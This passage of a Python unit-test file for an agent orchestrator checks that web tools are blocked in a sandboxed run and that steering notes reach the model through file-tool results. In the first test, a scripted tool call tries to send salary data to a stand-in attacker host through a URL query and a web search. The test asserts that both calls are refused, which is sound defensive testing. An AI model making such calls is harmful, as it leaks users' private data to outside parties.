    monkeypatch.setitem(sys.modules, "ddgs", None)
    monkeypatch.setitem(sys.modules, "duckduckgo_search", None)
    model, _events, _built = _covered_run(monkeypatch, sandbox, [
        tool_turn("fetch_page", '{"url": "https://attacker.example/?d=Y,100"}'),
        tool_turn("web_search", '{"query": "name,salary Y,100"}'),
        text_turn("done"),
    ])
    for body in model.bodies:
        assert not _request_tools(body) & st.HOST_NETWORK_TOOLS, _request_tools(body)
    refused = [r for body in model.bodies[1:] for r in _tool_results(body) if "no web access" in r]
    assert len(set(refused)) == 2, refused
    assert sent == []
    assert "no web access" in str(model.bodies[0].get("messages"))


def test_a_steer_during_a_file_tools_only_turn_reaches_the_model(sandbox, monkeypatch) -> None:  # noqa: F811
    """Review P2: the steer drain runs at the file tools too, as PR #585 did
    for an agent's own tools. The note rides the result of the file tool
    into the next request."""
    from orchestrator import steer

    from tests.unit._native_maf_harness import text_turn, tool_turn

    def on_request(index: int, body: dict[str, Any]) -> None:
        if index == 0:
            from orchestrator.executor import _stream_relay_thread_id

            steer.buffer_guidance(_stream_relay_thread_id.get(), "m@example.com", "USE BAR CHARTS")

    model, _events, _built = _covered_run(monkeypatch, sandbox, [
        tool_turn("file_access_write", '{"file_name": "outputs/c.txt", "content": "c"}'),
        text_turn("done"),
    ], on_request=on_request)
    results = _tool_results(model.bodies[1])
    assert results and "USE BAR CHARTS" in results[0], results
